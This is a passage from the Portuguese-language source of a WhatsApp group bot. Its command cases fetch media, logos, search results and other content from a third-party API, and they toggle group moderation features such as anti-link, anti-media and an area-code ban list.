yoko.sendMessage(from, {audio: {url: `https://api.bronxyshost.com.br/api-bronxys/${command}?url=${q}&apikey=${API_KEY_BRONXYS}`}, mimetype: "audio/mpeg"}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break;

/*case 'instagram':
try {
if(q.length < 5) return reply(`Exemplo: ${prefix+command} o link`);
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/instagram?url=${q.trim()}&apikey=${API_KEY_BRONXYS}`)
reply("Realizando aÃ§Ã£o..")
let DM_T = ABC.msg[0].type
var A_T = DM_T === "mp4" ? "video/mp4" : DM_T === "webp" ? "image/webp" : DM_T === "jpg" ? "image/jpeg" : DM_T === "mp3" ? "audio/mpeg" : "video/mp4"
yoko.sendMessage(from, {[A_T.split("/")[0]]: {url: ABC.msg[0].url}, mimetype: A_T}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break;*/

case 'insta_audio':
try {
if(!q.trim()) return reply(`Exemplo: ${prefix+command} o link`);
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/instagram?url=${q.trim()}&apikey=${API_KEY_BRONXYS}`)
reply("AGUARDE, REALIZANDO AÃ‡ÃƒO.")
let DM_T = ABC.msg[0].type
var A_T = DM_T === "webp" ? "image/webp" : DM_T === "jpg" ? "image/jpeg" : DM_T === "mp3" ? "audio/mpeg" : "audio/mpeg"
yoko.sendMessage(from, {[A_T.split("/")[0]]: {url: ABC.msg[0].url}, mimetype: A_T}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break;

case 'mediafire':
try {
if(!q.includes("mediafire.com")) return reply("Faltando o link do mediafire para download do arquivo, cade?");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/mediafire?url=${q}&apikey=${API_KEY_BRONXYS}`)
reply(`Enviando: ${ABC.resultado[0].nama}\n\nPeso: ${ABC.resultado[0].size}`)
yoko.sendMessage(from, {document: {url: ABC.resultado[0].link}, mimetype: "application/"+ABC.resultado[0].mime, fileName: ABC.resultado[0].nama}).catch(e => {
return reply("Erro..");
})
} catch (e) {
console.log(String(e))
return reply("Erro..")
}
break;

case 'signo':
try {
if(!q.trim()) return reply(`Digite seu signo, exemplo: ${prefix+command} virgem`);
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/horoscopo?signo=${q}&apikey=${API_KEY_BRONXYS}`)
yoko.sendMessage(from, {image: {url: ABC.img}, caption: `Signo: ${q}\n\n${ABC.title}\n${ABC.body}`}).catch(e => {
return reply("Erro..");
})
} catch (e) {
return reply("Erro..");
}
break;

//INFORMAR
case 'moedas': case 'moeda':
try {
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/Moedas_Agora?apikey=${API_KEY_BRONXYS}`)
reply(`${ABC?.dolar}\n\n${ABC?.euro}\n\n${ABC?.libra}\n\n${ABC?.bitcoin}\n\n${ABC?.ethereum}\n\n${ABC?.bovespa}\n\n${ABC?.ouro}`);
} catch {
return reply("Erro, breve volta.")
}
break;

case "letra": case "liryc": case "letram": case "letramusic": case "letramusica": {
if(!q.trim()) return reply(`Exemplo: ${prefix+command} Ela me traiu`)
try {
reply("Aguarde...")
const abc = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/letra_musica?letra=${q.trim()}&apikey=${API_KEY_BRONXYS}`)
reply(` - Titulo: ${abc.titulo}\n\n - Compositor: ${abc.compositor}\n\n - Letra: ${abc.letra}`)
} catch (e) {
reply("Erro...")
}
}
break;

case 'pergunta': case 'openai': case 'gpt': case 'chatgpt':
try {
reply("Aguarde, criando / pesquisando sobre o que esta perguntando ou pedindo.");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/PERGUNTE_E_EU_RESPONDO?q=${q.trim()}&apikey=${API_KEY_BRONXYS}`)
reply(`( ${ABC.msg} )`)
} catch { 
reply("Erro..")
}
break;

case 'esportenoticias': case 'esportenoticia': case 'espnoticia': case 'espnoticias':
case 'noticiasesporte': case 'noticiaesporte': case 'noticiaesp': case 'noticiasesp':
case 'esporte_noticias': case 'esporte_noticia': case 'esporte-noticias': case 'esporte-noticia':
reply("Aguarde, realizando aÃ§Ã£o..")
try {
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/esporte_noticias?apikey=${API_KEY_BRONXYS}`)
AB =""
for ( i = 1; i < ABC.length; i++) {
AB += `${ABC[i].titulo}\n\n`
}
yoko.sendMessage(from, {image: {url: ABC[0].img}, caption: AB}, {quoted: info})
} catch {
return reply("Erro, tente novamente ou aguarde atÃ© voltar ao normal.")
}
break;

case "playstore":
if(q.length < 2) return reply("Cade o tÃ­tulo do apk que deseja pesquisar?")
data = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/playstore?nome=${q}&apikey=${API_KEY_BRONXYS}`)
ABC = "Play Store pesquisa:\n\n"
for(let a of data.resultados) {
ABC += `\n\n${a.title}\n\n----------------------------------------------\nID:
${a.appId}\n\n----------------------------------------------\n\nURL:
${a.url}\n\n----------------------------------------------`
}
reply(ABC)
break;

case 'celular':
try {
if(!q.trim()) return reply(`Exemplo: ${prefix+command} galaxy a9 2018`);
reply("Realizando aÃ§Ã£o..");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/info_celular?celular=${q}&apikey=${API_KEY_BRONXYS}`);
reply(`ğŸ“± Celular: ${ABC.celular || "NÃ£o encontrado"}\n\nInformaÃ§Ãµes:\n${ABC.resumo || ABC.infoc || "NÃ£o encontrado, seja mais especÃ­fico, a marca e a versÃ£o"}`);
} catch (e) {
return reply("Erro...");
}
break;

case 'amazon': case 'amazonsearch':
if(q.trim().length < 4) return reply(`Exemplo: ${prefix+command} fone redmi airdots 2`)
try {
reply("Aguarde..")
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/Amazon_Pesquisa?pesquisa=${q.trim()}&apikey=${API_KEY_BRONXYS}`)
RST = "Pesquisa Amazon:\n\n"
for ( i  = 0; i < (ABC.length > 40 ? 40: ABC.length); i++) {
RST +=  `( ${i+1} ) - Titulo: ${ABC[i].titulo}\n- PreÃ§o: ${ABC[i].preco}\n- Url: ${ABC[i].url}\n${"_".repeat(27)}\n\n`
}
reply(RST);
} catch {
return reply(`Erro, nÃ£o foi possivel encontrar.`)
}
break;

case 'pesquisa_yt': case 'ytsearch':
try {
if(!q.trim()) return reply(`Digite o nome de algum vÃ­deo ou mÃºsica que deseja encontrar..`);
AB = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/pesquisa_ytb?nome=${q}&apikey=${API_KEY_BRONXYS}`)
ABC = `${"-\t".repeat(13)}\n\n`
for (var i of AB) {
ABC += `Titulo: ${i.titulo}\nUrl: ${i.url}\nTempo: ${i.tempo}\nPostado: ${i.postado}\n\nDescriÃ§Ã£o: ${i.desc}\n\n`;
ABC += `${"-\t".repeat(13)}\n\n`
}
reply(ABC);
} catch (e) {
return reply(`Erro....`)
}
break;

case 'print': case 'printdesite':
if(!q.trim()) return reply(`Faltando a url do site que quer tirar print, Exemplo: ${prefix+command} https://google.com\n\nNÃ£o esqueÃ§a do https se o site tiver, ou http se nÃ£o for um site com ssl`)
try {
yoko.sendMessage(from, {image: {url: `https://api.bronxyshost.com.br/api-bronxys/print_de_site?url=${q.trim()}&apikey=${API_KEY_BRONXYS}`}}, {quoted: info}) 
} catch {
return reply("Erro..");
}
break;

case 'gimage':
try {
if(!q.trim()) return reply(`Exemplo: ${prefix+command} naruto`)
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/google-img?nome=${q}&apikey=${API_KEY_BRONXYS}`);
yoko.sendMessage(from, {image: {url: ABC[Math.floor(Math.random() * ABC.length)].url}}).catch(() => {
return reply("Erro..");
})
} catch (e) {
return reply("Erro..");
}
break;

case 'pinterest': 
try {
if(!q) return reply('Informe o nome da imagem!');
reply('Buscando imagem solicitada...')

await yoko.sendMessage(from, {image: 
{url: `https://api.nexfuture.com.br/api/pesquisas/pinterest?query=${encodeURIComponent(q)}`}}, 
{quoted: info});
} catch (error) {
console.log(error);
return reply('Deu um pequeno erro, tente novamente mais tarde!');
}
break;

case 'cep':
try {
if(!q.trim()) return reply("digite o CEP que deseja buscar informaÃ§Ãµes..");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/consultacep?cep=51240230&apikey=${API_KEY_BRONXYS}`)
reply(`Cep: ${ABC.cep}\nRua: ${ABC.rua}\nComplemento: ${ABC.complemento}\nBairro: ${ABC.vizinhanÃ§a}\nCidade: ${ABC.cidade}\nEstado: ${ABC.estado}\nGia: ${ABC.gia}\nIbge: ${ABC.ibge}\nddd: ${ABC.ddd}\nSiafi: ${ABC.siafi}`)
} catch (e) {
return reply("Erro..")
}
break

case 'metadinha':
try {
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/metadinha?apikey=${API_KEY_BRONXYS}`);
yoko.sendMessage(from, {image: {url: ABC.link1}}).catch(e => {
return reply("Erro..")
})
yoko.sendMessage(from, {image: {url: ABC.link2}}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro..")
}
break;

//COMANDOS BÃSICOS DE LOGOS
case 'angelwing':  case 'hackneon': case 'fpsmascote': 
case 'equipemascote': case 'txtquadrinhos': case 'ffavatar':
case 'mascotegame': case 'angelglx': case 'gizquadro': 
case 'wingeffect': case 'blackpink': case 'metalgold':
case 'girlmascote': case 'logogame':
try {
if(!q.trim()) return reply(`Digite algo, Exemplo: ${prefix+command} bronxys`);  
reply("Realizando aÃ§Ã£o..");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/logos_EPH?texto=${q}&category=${command}&apikey=${API_KEY_BRONXYS}`);
yoko.sendMessage(from, {image: {url: ABC.resultado}}, {quoted: info}).catch(() => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break;

case 'shadow': case 'metalgold': case 'cup': case 'txtborboleta':
case 'cemiterio': case 'efeitoneon': case 'harryp':
case 'lobometal': case 'neon2': case 'madeira': case 'lovemsg3':
case 'coffecup': case 'coffecup2': case 'florwooden':
case 'narutologo': case 'fire': case 'romantic': case 'smoke':  
case 'papel': case 'lovemsg': case 'lovemsg2':
try {
if(!q.trim()) return reply(`Digite algo, Exemplo: ${prefix+command} bronxys`);  
reply("Realizando aÃ§Ã£o..");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/logos_PHT?texto=${q}&category=${command}&apikey=${API_KEY_BRONXYS}`);
yoko.sendMessage(from, {image: {url: ABC.resultado.imageUrl}}, {quoted: info}).catch(() => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break;

case 'fiction': case '3dstone': case 'areia': case 'style': 
case 'blood': case 'pink': case 'cattxt': case 'neondevil':
case 'carbon': case 'metalfire': case 'thunder': case 'vidro': 
case 'jokerlogo': case 'transformer': case 'demonfire':
case 'jeans': case 'metalblue': case 'natal': case 'ossos':
case 'asfalto': case 'break': case 'glitch2': case 'colaq':
case 'neon3': case 'nuvem': case 'horror': case 'matrix':
case 'berry': case 'luxury': case 'lava': case 'thunderv2':
case 'neongreen': case 'neve': case 'neon': case 'neon1':  
case 'neon3d': case 'gelo': case 'neon3': case '3dgold':
case 'lapis': case 'toxic': case 'demongreen': case 'rainbow':
case 'halloween':
try {
if(!q.trim()) return reply(`Digite algo, Exemplo: ${prefix+command} bronxys`);  
reply("Realizando aÃ§Ã£o..");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/logos?texto=${q}&category=${command}&apikey=${API_KEY_BRONXYS}`);
bufferImg(ABC.resultado);
} catch (e) {
return reply("Erro...");
}
break;

case 'marvel': case 'pornhub': case 'space': case 'stone': case 'steel': case 'grafity': case 'glitch3': case 'america':
try {
var [DG, DG2] = q.split("|")
if(!q.includes("|")) return reply(`Exemplo: ${prefix+command} Bronxys|Aleatory`)
reply("Realizando aÃ§Ã£o..");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/logos_2?texto=${DG}&texto2=${DG2}&category=${command}&apikey=${API_KEY_BRONXYS}`);
bufferImg(ABC.resultado);
} catch (e) {
return reply("Erro...");
}
break;

// COMANDOS BÃSICOS // PARA MEMBRO COMUM
case 'gerarnick':
try {
if(!q.trim()) return reply(`Escreveva um nome para eu enviar ele com letras modificadas, Exemplo: ${prefix+command} bronxys`);
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/gerar_nick?nick=${encodeURI(q)}&apikey=${API_KEY_BRONXYS}`)
AB = `Lista com base no Nick informado, para encontrar melhor fonte para utilizar:\n\n`;
for ( i of ABC) {
AB += `${i}\n\n`;
}
reply(AB);
} catch (e) {
return reply("Erro..");
}
break;

case 'attp': case 'attp2':
try {
if(!q.trim()) return reply(`Exemplo: ${prefix+command} bronxys`);
reply("AGUARDE, REALIZANDO AÃ‡ÃƒO.")
var Fontes = command === "attp2" ? "Roboto" : "Noto Emoji, Noto Sans Mono"
yoko.sendMessage(from, {sticker: {url: `https://api.bronxyshost.com.br/api-bronxys/attp_edit?texto=${encodeURIComponent(q)}&fonte=${Fontes}&apikey=${API_KEY_BRONXYS}`}}, {quoted: info}).catch(() => {
return reply("Erro..");
})
} catch (e) {
return reply("Erro..");
}
break;

// MONTAGEM
case 'lixo': case 'lgbt': case 'morto': case 'preso': case 'deletem':
case 'procurado': case 'hitler': case 'borrar': case 'merda':
try {
IMG = JSON.parse(JSON.stringify(info)?.replace('quotedM','m'))?.message?.extendedTextMessage?.contextInfo?.message?.imageMessage || info.message?.imageMessage
PXR = await getFileBuffer(IMG, "image")
reply("Realizando aÃ§Ã£o..")
link = await upload(PXR)
yoko.sendMessage(from, {image: {url:`https://api.bronxyshost.com.br/api-bronxys/montagem?url=${link}&category=${command}&apikey=${API_KEY_BRONXYS}`}}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply('Marque uma imagem no WhatsApp, formato jpeg/jpg');
}
break

case 'gitclone':
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return reply(`Exemplo: ${prefix}gitclone https://github.com/whiskeysockets/baileys`);
reply(mess.wait())
let [user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
await yoko.sendMessage(from, {document: {url: `https://api.github.com/repos/${user}/${repo}/zipball`}, fileName: filename+'.zip', mimetype: 'application/zip' }, {quoted: selo}).catch(async(error) => {
return reply(mess.error());
})
break

case 'antiimg':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntiImg) return reply('O recurso de anti imagem jÃ¡ estÃ¡ ativado.')
dataGp[0].antiimg = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de anti imagem neste grupo.ï¸')
} else if(Number(args[0]) === 0) {
if(!isAntiImg) return reply('O recurso de anti imagem jÃ¡ estÃ¡ desativado.')
dataGp[0].antiimg = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de anti imagem neste grupo.')
} else {
reply('1 para ativar, 0 para desativar.')
}
break

case 'antivideo':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntiVid) return reply('O recurso de anti vÃ­deo jÃ¡ estÃ¡ ativado.')
dataGp[0].antivideo = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de anti video neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isAntiVid) return reply('O recurso de anti vÃ­deo jÃ¡ estÃ¡ desativado.')
dataGp[0].antivideo = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de anti video neste grupo.')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiaudio':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntiAudio) return reply('O recurso de anti Ã¡udio jÃ¡ estÃ¡ ativado.')
dataGp[0].antiaudio = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de anti audio neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isAntiAudio) return reply('O recurso de anti Ã¡udio jÃ¡ estÃ¡ desativado.')  
dataGp[0].antiaudio = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de anti audio neste grupo.')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antisticker':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntiSticker) return reply('O recurso de anti sticker jÃ¡ estÃ¡ ativado.')
dataGp[0].antisticker = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de anti sticker neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isAntiSticker) return reply('O recurso de anti sticker jÃ¡ estÃ¡ desativado.')
dataGp[0].antisticker = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de anti sticker neste grupo.')
} else {
reply('1 para ativar, 0 para desativar.')
}
break

case 'antidocumento':
case 'antidoc':
if(!isGroup) return reply(mess.onlyGroup());
if(!isGroupAdmins) return reply(mess.onlyAdmins());
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin());
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(Antidoc) return reply('O recurso de anti documento jÃ¡ estÃ¡ ativado.')
dataGp[0].antidoc = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de anti documento neste grupo.')
} else if(Number(args[0]) === 0) {
if(!Antidoc) return reply('O recurso de anti documento jÃ¡ estÃ¡ desativado.')
dataGp[0].antidoc = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de anti documento neste grupo.')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antictt':
case 'anticontato':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntiCtt) return reply('O recurso de anti contato jÃ¡ estÃ¡ ativado.')
dataGp[0].antictt = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de anti contato neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isAntiCtt) return reply('O recurso de anti contato jÃ¡ estÃ¡ desativado.')
dataGp[0].antictt = false
setGp(dataGp)
reply('ï¸Desativou com sucesso o recurso de anticontato neste grupo.ï¸')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiloc':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())								
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(Antiloc) return reply('O recurso de anti loc jÃ¡ estÃ¡ ativado.')
dataGp[0].antiloc = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de anti loc neste grupo.')
} else if(Number(args[0]) === 0) {
if(!Antiloc) return reply('O recurso de anti loc jÃ¡ estÃ¡ desativado.')
dataGp[0].antiloc = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de anti loc neste grupo.')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiddd': case 'anti_ddd': case 'anti-ddd':
if(!isGroup) return await reply(mess.onlyGroup())
if(!isGroupAdmins) return await reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return await reply(mess.onlyBotAdmin())
if(args.length < 1) return await reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntiDDD) return await reply('Este recurso jÃ¡ estÃ¡ ativado atualmente senhor(a)!');
dataGp[0].ANTI_DDD.active = true
setGp(dataGp)
await reply('(â™¦ï¸) O recurso de remoÃ§Ã£o de nÃºmeros com DDD adicionado Ã  lista, foi ativado com sucesso!');
} else if(Number(args[0]) === 0) {
if(!isAntiDDD) return await reply('Este recurso jÃ¡ estÃ¡ desativado atualmente senhor(a)!');
dataGp[0].ANTI_DDD.active = false
setGp(dataGp)
await reply('(â™¦ï¸) O recurso de remoÃ§Ã£o de nÃºmeros com DDD adicionado Ã  lista, foi desativado com sucesso!');
} else {
await reply('1 para ativar, 0 para desativar.');
}
break

case 'antiddd-list':
if(!isGroup) return await reply(mess.onlyGroup())
if(!isAntiDDD) return await reply(`Para usar este comando, vocÃª deve ativar o comando: antiddd\nExemplo: ${prefix}antiddd 1.`)
if(dataGp[0].ANTI_DDD.listaProibidos.length < 1) return await reply(`[!] NÃ£o existe nenhum ddd proibido neste grupo. Para adicionar Ã  lista, use: ${prefix}add_ddd 21, por exemplo.`);
await reply(`Aqui estÃ¡ a lista de DDD proibidos no grupo: '${groupName}':\nâ€¢ *[Total: ${dataGp[0].ANTI_DDD.listaProibidos.length}]* - ${dataGp[0].ANTI_DDD.listaProibidos.map((v, index) => v).join(", ")}`);
break

case 'add_ddd':
if(!isGroup) return await reply(mess.onlyGroup())
if(!isGroupAdmins) return await reply(mess.onlyAdmins())
if(!isAntiDDD) return await reply(`Para usar este comando, vocÃª deve ativar o comando: antiddd\nExemplo: ${prefix}antiddd 1.`)
if(!q.trim()) return await reply("Determine o DDD que vocÃª deseja adicionar na lista, nÃ£o pode conter espaÃ§o vÃ¡zio.")
if(q.trim() === 2) return await reply(`Um DDD possuÃ­ 2 dÃ­gitos numÃ©ricos, por exemplo: 81 (Este DDD pertence Ã  Pernambuco).`)
if(dataGp[0].ANTI_DDD.listaProibidos.indexOf(q.trim()) >= 0) return await reply(`Esse DDD jÃ¡ se encontra incluso, procure ver na lista dos DDDs banidos no grupo, use: '${prefix}antiddd-list'`)
if(arrayDDDs.indexOf(q.trim()) >= 0) return await reply('O DDD preenchido Ã© invÃ¡lido, nÃ£o existe nenhum nÃºmero com este DDD atualmente.');
dataGp[0].ANTI_DDD.listaProibidos.push(q.trim())
setGp(dataGp)
await reply(`â€¢ O DDD '${q.trim()}' foi adicionado com sucesso Ã  blacklist, agora os nÃºmeros que tiver o DDD de ${extractStateFromDDD(q.trim())} serÃ¡ imediatamente banido do grupo.`)
break

case 'delete_ddd': case 'del_ddd': case 'rm_ddd':
if(!isGroup) return await reply(mess.onlyGroup())
if(!isGroupAdmins) return await reply(mess.onlyAdmins())
if(!isAntiDDD) return await reply(`Para usar este comando, vocÃª deve ativar o comando: antiddd\nExemplo: ${prefix}antiddd 1.`) 
if(!q.trim()) return await reply("Determine o DDD que vocÃª deseja remover da lista, nÃ£o pode conter espaÃ§o vÃ¡zio.")
if(q.trim() === 2) return await reply(`Calma, sÃ³ pode ser removido um DDD por vez.\nâ€¢ Exemplo: ${prefix+command} 84, aÃ­ o bot nÃ£o vai mais remover os DDDs pertencentes Ã  Rio Grande do Sul.`)
if(dataGp[0].ANTI_DDD.listaProibidos.indexOf(q.trim()) < 0) return await reply(`Este DDD nÃ£o estÃ¡ incluso, procure ver na lista dos DDDs excluÃ­dos para este grupo. Use: ${prefix}antiddd-list`)
if(dataGp[0].ANTI_DDD.listaProibidos.length == 0) return await reply("A lista atualmente estÃ¡ vÃ¡zia, entÃ£o nÃ£o tem como remover nenhum DDD, adicione pelo menos um.")
dataGp[0].ANTI_DDD.listaProibidos.splice(dataGp[0].ANTI_DDD.listaProibidos.indexOf(q.trim()), 1)
setGp(dataGp)
await reply(`O DDD '${q.trim()}' tirado com sucesso da lista de DDDs excluÃ­dos do grupo com sucesso, agora o bot nÃ£o irÃ¡ mais impedir Ã  entrada deles.`);
break

case 'antilinkgp':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntilinkgp) return reply('O recurso de antilink de grupo jÃ¡ estÃ¡ ativado.')
dataGp[0].antilinkgp = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de antilink de grupo.')
} else if(Number(args[0]) === 0) {
if(!isAntilinkgp) return reply('O recurso de antilink de grupo jÃ¡ estÃ¡ desativado.')
dataGp[0].antilinkgp = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de antilink de grupo.')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antilinkhard':
case 'antilink':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntiLinkHard) return reply('O recurso de antilink hardcore jÃ¡ estÃ¡ ativado.')
dataGp[0].antilinkhard = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de antilink hardcore neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isAntiLinkHard) return reply('O recurso de antilink hardcore jÃ¡ estÃ¡ desativado.')
dataGp[0].antilinkhard = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de antilink harcore neste grupo.ï¸')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antilinkeasy':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntiLinkEasy) return reply('O recurso de antilink easy jÃ¡ estÃ¡ ativado.')
dataGp[0].antilinkeasy = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de antilink easy neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isAntiLinkEasy) return reply('O recurso de antilink easy jÃ¡ estÃ¡ desativado.')
dataGp[0].antilinkeasy = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de antilink easy neste grupo.ï¸')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'x9':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isx9) return reply('O recurso de x9 jÃ¡ estÃ¡ ativado.')
dataGp[0].x9 = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de x9 neste grupo, irei notificar quando alguÃ©m for rebaixado/promovido a adm e tambÃ©m quando ouver fixaÃ§Ã£o/desafixaÃ§Ã£o de mensagem do(s) adminstrador(es).')
} else if(Number(args[0]) === 0) {
if(!isx9) return reply('O recurso de x9 jÃ¡ estÃ¡ desativado.')
dataGp[0].x9 = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de x9 neste grupo, nÃ£o irei mais notificar promoÃ§Ã£o de adm nem rebaixamento ou fixaÃ§Ã£o/desafixaÃ§Ã£o de mensagem do(s) adminstrador(es).')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'visualizarmsg':
if(!SoDono) return reply(mess.onlyOwner())
if(!isVisualizar) {
nescessario.visualizarmsg = true
setNes(nescessario)
reply('Ativou com sucesso o recurso de visualizar todas as mensagens enviada em grupos e privado.')
} else if(isVisualizar) {
nescessario.visualizarmsg = false
setNes(nescessario)
reply('Desativou com sucesso o recurso de visualizar todas as mensagens enviada em grupos e privado.')
}
break

case 'x9visuunica':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
